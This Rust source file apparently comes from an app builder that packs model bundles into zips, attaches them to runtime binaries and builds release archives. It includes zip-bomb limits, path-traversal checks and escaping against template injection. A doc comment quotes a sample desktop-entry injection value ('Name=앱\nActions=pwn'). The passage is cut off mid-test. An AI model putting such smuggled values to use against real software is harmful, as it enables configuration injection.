//! `.nlapp` 번들 (zip) 읽기/쓰기와 런타임 바이너리 첨부. 규약은 `nl_core::bundle`.

pub mod icon;
pub mod inno;
pub mod manifest;
pub mod tools;

pub use icon::{default_icon_png, png_bytes_to_ico, png_bytes_to_square_png, png_to_ico};
pub use manifest::{build_manifest, write_manifest, MANIFEST_FILE};
// 빌더가 매니페스트를 만들 때 nl-update 를 따로 의존하지 않아도 되도록 다시 내보낸다.
pub use inno::{app_id, find_inno_setup, render_iss, windows_installer, InnoSetup};
pub use nl_update::{Asset, AssetKind, Manifest as UpdateManifest};
pub use tools::{install_inno_setup_plan, run_tool_plan, ToolPlan, ToolProgress};

use nl_core::bundle::{trailer, BUNDLE_TRAILER_MAGIC, MANIFEST_NAME, PROJECT_NAME, WEIGHTS_DIR};
use nl_core::{BundleManifest, Project, ProjectFile};
use sha2::{Digest, Sha256};
use std::collections::BTreeMap;
use std::fs::File;
use std::io::{Cursor, Read, Seek, SeekFrom, Write};
use std::ops::Range;
use std::path::{Path, PathBuf};

/// zip 안에서 에셋이 놓이는 디렉터리.
pub const ASSETS_DIR: &str = "assets";

/// 번들 zip 의 엔트리 개수 상한. 정상 번들은 가중치 몇 개 + 에셋 몇 십 개다.
pub const MAX_ZIP_ENTRIES: usize = 10_000;
/// 엔트리 하나가 선언할 수 있는 최대 해제 크기.
pub const MAX_ENTRY_BYTES: u64 = 512 * 1024 * 1024;
/// 번들 하나를 푸는 동안 쓸 수 있는 총 해제 바이트. zip bomb 의 상한이 된다.
pub const MAX_BUNDLE_BYTES: u64 = 2_000_000_000;
/// `Vec::with_capacity` 에 넘길 수 있는 최대값.
///
/// zip 중앙 디렉터리의 `uncompressed_size` 는 **공격자가 적는 숫자**다. 그대로 선할당하면
/// 200 바이트짜리 파일이 `handle_alloc_error` 로 프로세스를 abort 시킨다(잡을 수 없다).
const ALLOC_CLAMP: u64 = 8 * 1024 * 1024;
/// 실행 파일 꼬리표 길이 (u64 길이 + 매직 6바이트).
pub const TRAILER_LEN: u64 = 14;

/// 메모리에 풀린 번들.
#[derive(Clone, Debug)]
pub struct Bundle {
    pub manifest: BundleManifest,
    pub project: Project,
    /// `weights/<file>` → 바이트.
    pub weights: std::collections::BTreeMap<String, Vec<u8>>,
    /// `assets/<path>` → 바이트.
    pub assets: std::collections::BTreeMap<String, Vec<u8>>,
}

impl Bundle {
    /// 매니페스트와 프로젝트만 담은 빈 번들.
    pub fn new(manifest: BundleManifest, project: Project) -> Self {
        Self {
            manifest,
            project,
            weights: BTreeMap::new(),
            assets: BTreeMap::new(),
        }
    }

    /// zip 바이트로 직렬화.
    pub fn to_zip(&self) -> anyhow::Result<Vec<u8>> {
        let mut zip = zip::ZipWriter::new(Cursor::new(Vec::<u8>::new()));
        let opts = file_options();

        zip.start_file(MANIFEST_NAME, opts)?;
        zip.write_all(serde_json::to_string_pretty(&self.manifest)?.as_bytes())?;

        zip.start_file(PROJECT_NAME, opts)?;
        zip.write_all(ProjectFile::new(self.project.clone()).to_json().as_bytes())?;

        for (name, bytes) in &self.weights {
            zip.start_file(entry_path(WEIGHTS_DIR, name), opts)?;
            zip.write_all(bytes)?;
        }
        for (name, bytes) in &self.assets {
            zip.start_file(entry_path(ASSETS_DIR, name), opts)?;
            zip.write_all(bytes)?;
        }
        Ok(zip.finish()?.into_inner())
    }

    /// zip 바이트를 읽어 번들로. **신뢰할 수 없는 입력**이라 해제량에 상한을 건다.
    ///
    /// 엔트리 개수([`MAX_ZIP_ENTRIES`]), 엔트리 하나의 크기([`MAX_ENTRY_BYTES`]),
    /// 번들 전체 누적 해제량([`MAX_BUNDLE_BYTES`]) 셋을 모두 본다.
    pub fn from_zip(bytes: &[u8]) -> anyhow::Result<Self> {
        let mut zip = zip::ZipArchive::new(Cursor::new(bytes))?;
        anyhow::ensure!(
            zip.len() <= MAX_ZIP_ENTRIES,
            "번들 항목이 너무 많습니다 ({} 개, 상한 {MAX_ZIP_ENTRIES} 개)",
            zip.len()
        );

        let mut budget = MAX_BUNDLE_BYTES;
        let manifest: BundleManifest = serde_json::from_slice(&read_entry(&mut zip, MANIFEST_NAME, &mut budget)?)
            .map_err(|e| anyhow::anyhow!("{MANIFEST_NAME} 을(를) 읽지 못했습니다: {e}"))?;
        let project = ProjectFile::from_json(&String::from_utf8(read_entry(&mut zip, PROJECT_NAME, &mut budget)?)?)
            .map_err(|e| anyhow::anyhow!("{PROJECT_NAME} 을(를) 읽지 못했습니다: {e}"))?
            .project;

        let mut weights = BTreeMap::new();
        let mut assets = BTreeMap::new();
        let mut seen: std::collections::HashSet<PathBuf> = std::collections::HashSet::new();
        for i in 0..zip.len() {
            let mut f = zip.by_index(i)?;
            if f.is_dir() {
                continue;
            }
            let name = f.name().to_string();
            let target = match (strip_dir(&name, WEIGHTS_DIR), strip_dir(&name, ASSETS_DIR)) {
                (Some(rest), _) => Some((&mut weights, rest.to_string())),
                (None, Some(rest)) => Some((&mut assets, rest.to_string())),
                (None, None) => None,
            };
            let Some((map, key)) = target else { continue };
            if key.is_empty() {
                continue;
            }
            // 이름이 겹치면 뒤가 앞을 조용히 덮어쓴다 — 무엇이 풀릴지 알 수 없게 되므로 거절한다.
            // 맵 키는 원문이지만 실제 파일 경로는 `safe_relative` 를 거치므로 **정규화한 뒤** 비교한다
            // (`weights/a` 와 `weights/./a` 는 다른 키지만 같은 파일이 된다).
            let norm = safe_relative(&key).unwrap_or_else(|| PathBuf::from(&key));
            anyhow::ensure!(seen.insert(norm), "번들에 같은 이름의 항목이 두 번 있습니다: {name}");
            let size = f.size();
            let buf = read_capped(&mut f, size, &name, &mut budget)?;
            map.insert(key, buf);
        }
        Ok(Self {
            manifest,
            project,
            weights,
            assets,
        })
    }

    /// 가중치를 임시 폴더에 풀어 `Session::load` 가 읽을 경로를 돌려준다.
    /// 키는 `weights` 맵의 키 그대로라 `BundledModel::weights_file` 로 바로 찾을 수 있다.
    pub fn materialize_weights(&self, dir: &Path) -> anyhow::Result<std::collections::BTreeMap<String, PathBuf>> {
        materialize(&self.weights, dir, "가중치")
    }

    /// 에셋도 같은 규칙으로 풀어 놓는다 (아이콘·라벨 목록 등).
    pub fn materialize_assets(&self, dir: &Path) -> anyhow::Result<std::collections::BTreeMap<String, PathBuf>> {
        materialize(&self.assets, dir, "에셋")
    }
}

/// 맵을 `dir` 아래에 푼다. **중간에 실패하면 그때까지 쓴 파일을 도로 지운다** —
/// 반쯤 풀린 폴더를 남기면 다음 실행이 그것을 온전한 것으로 착각한다.
fn materialize(
    items: &BTreeMap<String, Vec<u8>>,
    dir: &Path,
    what: &str,
) -> anyhow::Result<std::collections::BTreeMap<String, PathBuf>> {
    std::fs::create_dir_all(dir)?;
    let mut out: BTreeMap<String, PathBuf> = BTreeMap::new();
    for (name, bytes) in items {
        let result = (|| -> anyhow::Result<PathBuf> {
            let rel =
                safe_relative(name).ok_or_else(|| anyhow::anyhow!("{what} 이름이 폴더 밖을 가리킵니다: {name}"))?;
            let path = dir.join(&rel);
            if let Some(parent) = path.parent() {
                std::fs::create_dir_all(parent)?;
            }
            std::fs::write(&path, bytes)?;
            Ok(path)
        })();
        match result {
            Ok(path) => {
                out.insert(name.clone(), path);
            }
            Err(e) => {
                for path in out.values() {
                    let _ = std::fs::remove_file(path);
                }
                return Err(e);
            }
        }
    }
    Ok(out)
}

fn file_options() -> zip::write::SimpleFileOptions {
    zip::write::SimpleFileOptions::default()
        .compression_method(zip::CompressionMethod::Deflated)
        .unix_permissions(0o644)
}

/// `weights` + `a/b.bin` → `weights/a/b.bin`. 이미 접두사가 붙어 있으면 그대로 둔다.
fn entry_path(dir: &str, name: &str) -> String {
    let name = name.trim_start_matches('/');
    if name == dir || name.starts_with(&format!("{dir}/")) {
        name.to_string()
    } else {
        format!("{dir}/{name}")
    }
}

/// zip 항목 이름에서 `<dir>/` 접두사를 떼어낸다. 다른 디렉터리면 `None`.
fn strip_dir<'a>(name: &'a str, dir: &str) -> Option<&'a str> {
    name.strip_prefix(dir)?.strip_prefix('/')
}

/// `..`·절대 경로·드라이브 접두사를 걸러 낸 상대 경로.
fn safe_relative(name: &str) -> Option<PathBuf> {
    use std::path::Component;
    let p = Path::new(name);
    let mut out = PathBuf::new();
    for c in p.components() {
        match c {
            Component::Normal(s) => out.push(s),
            Component::CurDir => {}
            _ => return None,
        }
    }
    if out.as_os_str().is_empty() {
        None
    } else {
        Some(out)
    }
}

fn read_entry<R: Read + Seek>(zip: &mut zip::ZipArchive<R>, name: &str, budget: &mut u64) -> anyhow::Result<Vec<u8>> {
    let mut f = zip
        .by_name(name)
        .map_err(|_| anyhow::anyhow!("번들에 {name} 이(가) 없습니다"))?;
    let size = f.size();
    read_capped(&mut f, size, name, budget)
}

/// 엔트리 하나를 상한 안에서 읽는다. `declared` 는 zip 이 **주장하는** 해제 크기다.
///
/// 세 가지를 한꺼번에 막는다. 주장값이 터무니없으면 읽기 전에 거절하고, 선할당은 클램프해서
/// 거짓 숫자로 프로세스를 abort 시키지 못하게 하며, 실제로 읽은 길이가 주장값과 다르면 거절한다.
fn read_capped(reader: &mut impl Read, declared: u64, name: &str, budget: &mut u64) -> anyhow::Result<Vec<u8>> {
    anyhow::ensure!(
        declared <= MAX_ENTRY_BYTES,
        "번들 항목이 너무 큽니다 ({name}: {declared} 바이트, 상한 {MAX_ENTRY_BYTES} 바이트)"
    );
    anyhow::ensure!(
        declared <= *budget,
        "번들 전체 해제 크기가 상한({MAX_BUNDLE_BYTES} 바이트)을 넘었습니다: {name}"
    );

    let mut buf = Vec::with_capacity(declared.min(ALLOC_CLAMP) as usize);
    // declared + 1 까지 읽어 "주장보다 크다" 도 잡아낸다.
    let read = std::io::Read::take(reader, declared + 1).read_to_end(&mut buf)? as u64;
    anyhow::ensure!(
        read == declared,
        "번들 항목의 크기가 목록과 다릅니다 ({name}: 목록 {declared} 바이트, 실제 {read} 바이트)"
    );
    *budget -= declared;
    Ok(buf)
}

// ───────────────────────────── 실행 파일 첨부 ─────────────────────────────

/// 런타임 실행 파일 + 번들 + 꼬리표 → `out`. 실행 권한 유지.
pub fn attach(runtime_exe: &Path, bundle_zip: &[u8], out: &Path) -> anyhow::Result<()> {
    if let Some(parent) = out.parent() {
        if !parent.as_os_str().is_empty() {
            std::fs::create_dir_all(parent)?;
        }
    }
    let mut src = File::open(runtime_exe)
        .map_err(|e| anyhow::anyhow!("런타임 실행 파일을 열지 못했습니다 ({}): {e}", runtime_exe.display()))?;
    let meta = src.metadata()?;
    let mut dst = File::create(out)?;
    std::io::copy(&mut src, &mut dst)?;
    dst.write_all(bundle_zip)?;
    dst.write_all(&trailer(bundle_zip.len() as u64))?;
    dst.flush()?;
    drop(dst);
    set_executable(out, &meta)?;
    Ok(())
}

#[cfg(unix)]
fn set_executable(path: &Path, src_meta: &std::fs::Metadata) -> anyhow::Result<()> {
    use std::os::unix::fs::PermissionsExt;
    // 원본 모드를 잇되 소유자/그룹/기타 실행 비트는 반드시 켜 둔다.
    let mode = (src_meta.permissions().mode() & 0o7777) | 0o755;
    std::fs::set_permissions(path, std::fs::Permissions::from_mode(mode))?;
    Ok(())
}

#[cfg(not(unix))]
fn set_executable(_path: &Path, _src_meta: &std::fs::Metadata) -> anyhow::Result<()> {
    // Windows 는 확장자로 실행 여부가 정해져 별도 권한 설정이 없다.
    Ok(())
}

/// 현재 실행 파일(또는 주어진 파일)에 첨부된 번들을 읽는다. 없으면 `Ok(None)`.
/// 실행 파일 전체를 메모리에 올리지 않도록 꼬리표 14바이트만 읽고 `seek` 로 번들 구간만 가져온다.
pub fn read_attached(exe: &Path) -> anyhow::Result<Option<Bundle>> {
    let mut f = File::open(exe)?;
    let total = f.seek(SeekFrom::End(0))?;
    if total < TRAILER_LEN {
        return Ok(None);
    }
    f.seek(SeekFrom::Start(total - TRAILER_LEN))?;
    let mut tail = [0u8; TRAILER_LEN as usize];
    f.read_exact(&mut tail)?;
    let Some(range) = attached_range(total, &tail) else {
        return Ok(None);
    };
    f.seek(SeekFrom::Start(range.start))?;
    let mut zip = vec![0u8; (range.end - range.start) as usize];
    f.read_exact(&mut zip)?;
    Bundle::from_zip(&zip).map(Some)
}

/// `nl_core::bundle::find_attached` 와 같은 규약을 파일 전체를 읽지 않고 적용한다.
/// 두 구현이 어긋나지 않는지는 `attached_range_matches_core` 테스트가 지킨다.
fn attached_range(total: u64, tail: &[u8; TRAILER_LEN as usize]) -> Option<Range<u64>> {
    if &tail[8..] != BUNDLE_TRAILER_MAGIC {
        return None;
    }
    let len = u64::from_le_bytes(tail[..8].try_into().ok()?);
    let end = total - TRAILER_LEN;
    if len > end {
        return None;
    }
    Some(end - len..end)
}

/// 대상 플랫폼의 런타임 실행 파일을 찾는다.
/// ① 현재 실행 파일 옆 `runtimes/<triple>/<file>` ② 현재 실행 파일 옆 `<file>` ③ `NL_RUNTIMES_DIR`.
pub fn find_runtime(target: Target) -> Option<PathBuf> {
    let file = target.runtime_file_name();
    let triple = target.triple();
    let mut candidates: Vec<PathBuf> = Vec::new();
    if let Some(dir) = std::env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(Path::to_path_buf))
    {
        candidates.push(dir.join("runtimes").join(triple).join(file));
        candidates.push(dir.join(file));
    }
    // 환경 변수는 어떤 실행 파일이 배포물에 들어갈지 정한다 — 상대 경로는 현재 폴더에 딸려 가므로 받지 않는다.
    if let Some(dir) = std::env::var_os("NL_RUNTIMES_DIR") {
        let dir = PathBuf::from(dir);
        if dir.is_absolute() {
            candidates.push(dir.join(triple).join(file));
            candidates.push(dir.join(file));
        } else {
            log::warn!(
                "NL_RUNTIMES_DIR 는 절대 경로여야 합니다 (무시합니다): {}",
                dir.display()
            );
        }
    }
    candidates.into_iter().find(|p| p.is_file())
}

// ───────────────────────────── 배포 아카이브 ─────────────────────────────

const INSTALL_SH: &str = include_str!("../templates/install.sh");
const DESKTOP: &str = include_str!("../templates/app.desktop");
const README_LINUX: &str = include_str!("../templates/README-linux.txt");
const README_WINDOWS: &str = include_str!("../templates/README-windows.txt");

/// `archive_with` 에 넘기는 설정. 기존 `archive` 가 받던 것에 아이콘이 더해졌다.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ArchiveOptions<'a> {
    pub target: Target,
    /// 번들이 첨부된 앱 실행 파일.
    pub app_exe: &'a Path,
    pub app_name: &'a str,
    pub version: &'a str,
    pub out_dir: &'a Path,
    /// 앱 아이콘 PNG. Linux 아카이브에 `<slug>.png` 로 들어가고 `install.sh` 가 아이콘 테마에 설치한다.
    pub icon: Option<&'a Path>,
}

impl<'a> ArchiveOptions<'a> {
    pub fn new(target: Target, app_exe: &'a Path, app_name: &'a str, version: &'a str, out_dir: &'a Path) -> Self {
        Self {
            target,
            app_exe,
            app_name,
            version,
            out_dir,
            icon: None,
        }
    }

    pub fn icon(mut self, icon: Option<&'a Path>) -> Self {
        self.icon = icon;
        self
    }
}

/// 배포 아카이브: Linux `tar.gz`(실행 파일 + install.sh + .desktop), Windows `zip`. 산출물 경로와 sha256 을 돌려준다.
/// 아이콘까지 넣으려면 `archive_with` 를 쓴다.
pub fn archive(
    target: Target,
    app_exe: &Path,
    app_name: &str,
    version: &str,
    out_dir: &Path,
) -> anyhow::Result<Artifact> {
    archive_with(ArchiveOptions::new(target, app_exe, app_name, version, out_dir))
}

/// 아이콘을 비롯한 추가 설정까지 받는 배포 아카이브.
pub fn archive_with(opts: ArchiveOptions<'_>) -> anyhow::Result<Artifact> {
    let ArchiveOptions {
        target,
        app_exe,
        app_name,
        version,
        out_dir,
        icon,
    } = opts;
    let version = check_version(version)?;
    let slug = slugify(app_name);
    let exe_bytes = std::fs::read(app_exe)
        .map_err(|e| anyhow::anyhow!("앱 실행 파일을 읽지 못했습니다 ({}): {e}", app_exe.display()))?;

    // 아이콘은 아이콘 테마가 요구하는 정사각 PNG 로 맞춰 둔다.
    let icon_png = match icon {
        Some(p) => {
            let raw =
                std::fs::read(p).map_err(|e| anyhow::anyhow!("아이콘을 읽지 못했습니다 ({}): {e}", p.display()))?;
            Some(icon::png_bytes_to_square_png(&raw, icon::LINUX_ICON_SIZE)?)
        }
        None => None,
    };

    std::fs::create_dir_all(out_dir)?;
    let path = match target {
        Target::LinuxX64 => {
            let out = out_dir.join(format!("{slug}-{version}-linux-x86_64.tar.gz"));
            write_tar_gz(&out, &slug, app_name, version, &exe_bytes, icon_png.as_deref())?;
            out
        }
        Target::WindowsX64 => {
            let out = out_dir.join(format!("{slug}-{version}-windows-x86_64.zip"));
            write_windows_zip(&out, &slug, app_name, version, &exe_bytes)?;
            out
        }
    };

    ensure_inside(out_dir, &path)?;
    let bytes = std::fs::read(&path)?;
    Ok(Artifact {
        sha256: sha256_hex(&bytes),
        size: bytes.len() as u64,
        path,
    })
}

/// 산출물 이름에 들어갈 버전을 검사한다. **semver 만 받는다.**
///
/// `Path::join` 은 구분자를 하위 경로로 받아들이므로, 검사하지 않으면 `../../..` 이 든 버전 문자열이
/// 산출물을 `out_dir` 밖에 떨군다. semver 는 `/`·`\`·`..` 를 애초에 허용하지 않아 이 한 줄로 닫힌다.
pub(crate) fn check_version(version: &str) -> anyhow::Result<&str> {
    let trimmed = version.trim();
    semver::Version::parse(trimmed).map_err(|e| anyhow::anyhow!("버전이 semver 가 아닙니다 ({version}): {e}"))?;
    Ok(trimmed)
}

/// `path` 가 정말 `dir` 안인지 확인한다. 경로를 만든 뒤 마지막으로 한 번 더 보는 안전망이다.
///
/// `dir` 은 이미 존재해야 하고 `path` 는 아직 없어도 된다 — 부모까지만 정규화해 비교한다.
pub(crate) fn ensure_inside(dir: &Path, path: &Path) -> anyhow::Result<()> {
    let base = dir
        .canonicalize()
        .map_err(|e| anyhow::anyhow!("출력 폴더를 확인하지 못했습니다 ({}): {e}", dir.display()))?;
    let parent = path.parent().unwrap_or(Path::new("."));
    let parent = parent
        .canonicalize()
        .map_err(|e| anyhow::anyhow!("출력 경로를 확인하지 못했습니다 ({}): {e}", parent.display()))?;
    anyhow::ensure!(
        parent.starts_with(&base),
        "산출물이 출력 폴더 밖을 가리킵니다: {} (출력 폴더 {})",
        path.display(),
        base.display()
    );
    Ok(())
}

fn write_tar_gz(
    out: &Path,
    slug: &str,
    app_name: &str,
    version: &str,
    exe: &[u8],
    icon_png: Option<&[u8]>,
) -> anyhow::Result<()> {
    let file = File::create(out)?;
    let gz = flate2::write::GzEncoder::new(file, flate2::Compression::default());
    let mut tar = tar::Builder::new(gz);

    let install = fill(INSTALL_SH, slug, app_name, version, Syntax::Shell);
    let desktop = fill(DESKTOP, slug, app_name, version, Syntax::Desktop);
    let readme = fill(README_LINUX, slug, app_name, version, Syntax::Text);

    tar_append(&mut tar, &format!("{slug}/{slug}"), exe, 0o755)?;
    tar_append(&mut tar, &format!("{slug}/install.sh"), install.as_bytes(), 0o755)?;
    tar_append(&mut tar, &format!("{slug}/{slug}.desktop"), desktop.as_bytes(), 0o644)?;
    tar_append(&mut tar, &format!("{slug}/README.txt"), readme.as_bytes(), 0o644)?;
    if let Some(png) = icon_png {
        tar_append(&mut tar, &format!("{slug}/{slug}.png"), png, 0o644)?;
    }

    tar.into_inner()?.finish()?;
    Ok(())
}

fn tar_append<W: Write>(tar: &mut tar::Builder<W>, path: &str, data: &[u8], mode: u32) -> anyhow::Result<()> {
    let mut header = tar::Header::new_gnu();
    header.set_size(data.len() as u64);
    header.set_mode(mode);
    header.set_mtime(0);
    header.set_uid(0);
    header.set_gid(0);
    header.set_entry_type(tar::EntryType::Regular);
    header.set_cksum();
    tar.append_data(&mut header, path, data)?;
    Ok(())
}

fn write_windows_zip(out: &Path, slug: &str, app_name: &str, version: &str, exe: &[u8]) -> anyhow::Result<()> {
    let mut zip = zip::ZipWriter::new(File::create(out)?);
    zip.start_file(format!("{slug}.exe"), file_options().unix_permissions(0o755))?;
    zip.write_all(exe)?;
    zip.start_file("README.txt", file_options())?;
    zip.write_all(fill(README_WINDOWS, slug, app_name, version, Syntax::Text).as_bytes())?;
    zip.finish()?.sync_all()?;
    Ok(())
}

/// 값이 놓이는 문법. 이스케이프 방식을 정한다.
///
/// 같은 무이스케이프 치환을 네 가지 출력 포맷에 쓰던 것이 H8(템플릿 인젝션)의 원인이었다.
/// 앱 이름과 버전은 프로젝트 파일에서 오는 **신뢰할 수 없는 값**이다.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Syntax {
    /// POSIX 셸. 값은 단일 인용 문자열 전체(따옴표 포함)로 치환된다.
    Shell,
    /// Desktop Entry(`.desktop`). 개행으로 새 키·그룹을 만들지 못하게 한다.
    Desktop,
    /// 사람이 읽는 텍스트. 제어문자만 걸러 낸다.
    Text,
}

fn fill(template: &str, slug: &str, app_name: &str, version: &str, syntax: Syntax) -> String {
    let (name, version) = match syntax {
        Syntax::Shell => (
            shell_quote(&sanitize_line(app_name)),
            shell_quote(&sanitize_line(version)),
        ),
        Syntax::Desktop => (desktop_escape(app_name), desktop_escape(version)),
        Syntax::Text => (sanitize_line(app_name), sanitize_line(version)),
    };
    fill_tokens(
        template,
        "{{",
        &[
            ("{{APP_SLUG}}", slug),
            ("{{APP_NAME}}", &name),
            ("{{APP_VERSION}}", &version),
        ],
    )
}

/// 한 줄짜리 값으로 정리한다. 개행·제어문자를 공백으로 접고 길이를 자른다.
///
/// 개행 하나만으로 셸 주석을 탈출하거나 `.desktop` 에 새 키를 만들 수 있어, 어느 포맷이든 먼저 거친다.
pub(crate) fn sanitize_line(v: &str) -> String {
    let mut out = String::with_capacity(v.len());
    for ch in v.chars() {
        if ch.is_control() {
            if !out.ends_with(' ') {
                out.push(' ');
            }
        } else {
            out.push(ch);
        }
    }
    let out = out.trim().to_string();
    // 템플릿 한 줄을 화면 밖으로 밀어내는 값도 막는다.
    out.chars().take(MAX_NAME_CHARS).collect()
}

/// 이름·버전 문자열의 최대 길이(문자 수).
pub(crate) const MAX_NAME_CHARS: usize = 200;

/// POSIX 셸 단일 인용. `'` 는 `'\''` 로 끊어 붙인다 — 안에서는 `$`·백틱·`"` 모두 글자다.
pub(crate) fn shell_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

/// Desktop Entry 값 이스케이프. 개행·탭·역슬래시를 명세의 두 글자 표기로 바꾼다.
///
/// 이렇게 해야 `Name=앱\nActions=pwn` 같은 값이 새 키나 새 그룹이 되지 못한다.
pub(crate) fn desktop_escape(v: &str) -> String {
    let mut out = String::with_capacity(v.len() + 8);
    for ch in v.chars() {
        match ch {
            '\\' => out.push_str(r"\\"),
            '\n' => out.push_str(r"\n"),
            '\r' => out.push_str(r"\r"),
            '\t' => out.push_str(r"\t"),
            // 남은 제어문자는 자리만 차지하지 않게 공백으로.
            c if c.is_control() => out.push(' '),
            c => out.push(c),
        }
    }
    out.trim().chars().take(MAX_NAME_CHARS).collect()
}

/// 템플릿을 한 번만 훑어 치환한다. 값 안에 다른 자리표시자 문자열이 들어 있어도 다시 치환되지 않는다.
/// `open` 은 자리표시자가 시작하는 글자(`@` 또는 `{{`), `pairs` 는 구분자를 포함한 전체 토큰과 값이다.
pub(crate) fn fill_tokens(template: &str, open: &str, pairs: &[(&str, &str)]) -> String {
    let mut out = String::with_capacity(template.len() + 256);
    let mut rest = template;
    'scan: while let Some(at) = rest.find(open) {
        out.push_str(&rest[..at]);
        let tail = &rest[at..];
        for (token, value) in pairs {
            if let Some(next) = tail.strip_prefix(*token) {
                out.push_str(value);
                rest = next;
                continue 'scan;
            }
        }
        // 아는 토큰이 아니면 여는 글자 하나만 흘려보내고 계속 찾는다.
        out.push_str(&tail[..open.len()]);
        rest = &tail[open.len()..];
    }
    out.push_str(rest);
    out
}

/// 파일·디렉터리 이름으로 안전한 소문자 ASCII 슬러그. 한글 등 비 ASCII 는 `-` 로 접힌다.
pub fn slugify(name: &str) -> String {
    let mut out = String::new();
    for ch in name.chars() {
        if ch.is_ascii_alphanumeric() {
            out.push(ch.to_ascii_lowercase());
        } else if !out.ends_with('-') {
            out.push('-');
        }
    }
    let out = out.trim_matches('-').to_string();
    if out.is_empty() {
        "app".into()
    } else {
        out
    }
}

pub fn sha256_hex(bytes: &[u8]) -> String {
    let mut h = Sha256::new();
    h.update(bytes);
    h.finalize().iter().map(|b| format!("{b:02x}")).collect()
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Target {
    LinuxX64,
    WindowsX64,
}

impl Target {
    pub fn label(&self) -> &'static str {
        match self {
            Target::LinuxX64 => "Linux x86_64",
            Target::WindowsX64 => "Windows x86_64",
        }
    }
    pub fn triple(&self) -> &'static str {
        match self {
            Target::LinuxX64 => "x86_64-unknown-linux-gnu",
            Target::WindowsX64 => "x86_64-pc-windows-msvc",
        }
    }
    pub fn runtime_file_name(&self) -> &'static str {
        match self {
            Target::LinuxX64 => "nl-runtime",
            Target::WindowsX64 => "nl-runtime.exe",
        }
    }
    pub fn host() -> Option<Target> {
        if cfg!(all(target_os = "linux", target_arch = "x86_64")) {
            Some(Target::LinuxX64)
        } else if cfg!(all(target_os = "windows", target_arch = "x86_64")) {
            Some(Target::WindowsX64)
        } else {
            None
        }
    }
}

#[derive(Clone, Debug, PartialEq)]
pub struct Artifact {
    pub path: PathBuf,
    pub sha256: String,
    pub size: u64,
}

#[cfg(test)]
mod tests {
    use super::*;
    use nl_core::bundle::{find_attached, BundledModel};

    fn sample() -> Bundle {
        let mut project = Project::new("샘플 프로젝트");
        let m1 = project.add_model("분류기");
        let m2 = project.add_model("회귀");
        let mut manifest = BundleManifest::new("내 앱", "1.2.3");
        manifest.built_with = "nl-app 테스트".into();
        manifest.models = vec![
            BundledModel {
                model: m1,
                weights_file: "classifier.safetensors".into(),
            },
            BundledModel {
                model: m2,
                weights_file: "regressor.safetensors".into(),
            },
        ];
        let mut b = Bundle::new(manifest, project);
        b.weights
            .insert("classifier.safetensors".into(), vec![1, 2, 3, 4, 5, 0, 255]);
        b.weights.insert("regressor.safetensors".into(), (0u8..64).collect());
        b.assets.insert("labels.txt".into(), "고양이\n개\n".as_bytes().to_vec());
        b.assets.insert("icons/app.png".into(), vec![0x89, b'P', b'N', b'G']);
        b
    }

    #[test]
    fn zip_round_trips() {
        let b = sample();
        let bytes = b.to_zip().unwrap();
        let back = Bundle::from_zip(&bytes).unwrap();
        assert_eq!(back.manifest, b.manifest);
        assert_eq!(back.manifest.models.len(), 2);
        assert_eq!(back.project, b.project);
        assert_eq!(back.project.models.len(), 2);
        assert_eq!(back.weights, b.weights);
        assert_eq!(back.assets, b.assets);
    }

    #[test]
    fn materialize_writes_weight_bytes() {
        let b = sample();
        let dir = tempfile::tempdir().unwrap();
        let map = b.materialize_weights(dir.path()).unwrap();
        assert_eq!(map.len(), 2);
        for (name, path) in &map {
            assert_eq!(&std::fs::read(path).unwrap(), &b.weights[name]);
        }
        let assets = b.materialize_assets(dir.path()).unwrap();
        assert_eq!(
            std::fs::read(&assets["icons/app.png"]).unwrap(),
            b.assets["icons/app.png"]
        );
    }

    #[test]
    fn attach_round_trips() {
        let dir = tempfile::tempdir().unwrap();
        let fake_exe = dir.path().join("nl-runtime");
        let exe_bytes: Vec<u8> = b"\x7fELF fake runtime binary bytes"
            .iter()
            .copied()
            .chain(0u8..200)
            .collect();
        std::fs::write(&fake_exe, &exe_bytes).unwrap();

        let b = sample();
        let zip = b.to_zip().unwrap();
        let out = dir.path().join("myapp");
        attach(&fake_exe, &zip, &out).unwrap();

        // 앞부분은 원본 실행 파일 그대로여야 한다.
        let written = std::fs::read(&out).unwrap();
        assert_eq!(&written[..exe_bytes.len()], &exe_bytes[..]);
        assert_eq!(written.len(), exe_bytes.len() + zip.len() + TRAILER_LEN as usize);

        let back = read_attached(&out).unwrap().expect("첨부 번들");
        assert_eq!(back.manifest, b.manifest);
        assert_eq!(back.weights, b.weights);
        assert_eq!(back.assets, b.assets);

        // 꼬리표가 없는 파일은 None.
        assert!(read_attached(&fake_exe).unwrap().is_none());

        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            assert_eq!(std::fs::metadata(&out).unwrap().permissions().mode() & 0o111, 0o111);
        }
    }

    #[test]
    fn attached_range_matches_core() {
        let mut exe = b"binary".to_vec();
        let bundle = b"PK\x03\x04 zip bytes";
        exe.extend_from_slice(bundle);
        exe.extend_from_slice(&trailer(bundle.len() as u64));

        let core = find_attached(&exe).unwrap();
        let tail: [u8; TRAILER_LEN as usize] = exe[exe.len() - TRAILER_LEN as usize..].try_into().unwrap();
        let ours = attached_range(exe.len() as u64, &tail).unwrap();
        assert_eq!(ours.start as usize, core.start);
        assert_eq!(ours.end as usize, core.end);

        // 길이가 파일보다 크면 둘 다 거부한다.
        let mut bad = b"tiny".to_vec();
        bad.extend_from_slice(&trailer(9_999));
        assert!(find_attached(&bad).is_none());
        let tail: [u8; TRAILER_LEN as usize] = bad[bad.len() - TRAILER_LEN as usize..].try_into().unwrap();
        assert!(attached_range(bad.len() as u64, &tail).is_none());
    }

    #[test]
    fn linux_archive_has_launcher_files() {
        let dir = tempfile::tempdir().unwrap();
        let exe = dir.path().join("built-app");
        std::fs::write(&exe, b"fake app binary").unwrap();

        let art = archive(Target::LinuxX64, &exe, "내 앱", "1.2.3", dir.path()).unwrap();
        assert_eq!(art.path.file_name().unwrap(), "app-1.2.3-linux-x86_64.tar.gz");
        assert!(art.size > 0);
        assert_eq!(art.sha256.len(), 64);
        assert_eq!(art.sha256, sha256_hex(&std::fs::read(&art.path).unwrap()));

        let gz = flate2::read::GzDecoder::new(File::open(&art.path).unwrap());
        let mut tar = tar::Archive::new(gz);
        let mut names = Vec::new();
        let mut install = String::new();
        for e in tar.entries().unwrap() {
            let mut e = e.unwrap();
            let name = e.path().unwrap().to_string_lossy().to_string();
